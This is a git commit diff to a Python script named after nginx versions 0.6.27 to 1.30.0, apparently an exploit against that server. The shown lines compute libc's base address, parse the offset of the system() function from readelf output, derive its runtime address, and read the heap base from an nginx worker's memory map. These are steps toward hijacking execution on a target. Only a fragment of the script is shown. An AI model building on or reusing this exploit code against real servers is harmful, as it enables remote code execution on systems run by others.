792260cf88971175227fe3fe5c56c4bda33adac9
El Dis <41779641+vomanc@users.noreply.github.com>
2026-09-10 14:22:06 +0200

    Update NGINX_0.6.27-1.30.0.py

--- NGINX_0.6.27-1.30.0.py
+++ NGINX_0.6.27-1.30.0.py
@@ -34,7 +34,7 @@ LIBC_BASE = f"0x{LIBC_BASE.decode()}"
 system_offset = subprocess.check_output(
     "readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E ' system(@|$)'",
     shell=True)
-
+system_offset = re.search(rb':\s+0*([0-9a-f]+)\s', system_offset).group(1)
 SYSTEM_ADDR = LIBC_BASE + system_offset.decode()
 # Determine the HEAP_BASE
 HEAP_BASE = subprocess.check_output(f"grep '\[heap\]' /proc/{nginx_worker_process}/maps", shell=True)
